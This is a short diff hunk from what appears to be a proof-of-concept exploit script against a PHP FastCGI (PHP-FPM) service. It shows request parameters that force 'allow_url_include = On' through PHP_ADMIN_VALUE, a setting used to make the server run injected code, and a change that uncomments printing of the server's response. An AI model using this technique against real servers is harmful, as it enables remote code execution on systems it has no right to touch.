@@ -256,7 +256,7 @@ def poc(host):
         'PHP_ADMIN_VALUE': 'allow_url_include = On'
     }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
     response = client.request(params, content)
-    #print(force_text(response))
+    print(force_text(response))
     return response.strip().splitlines()[-1]
 
 if __name__ == '__main__':
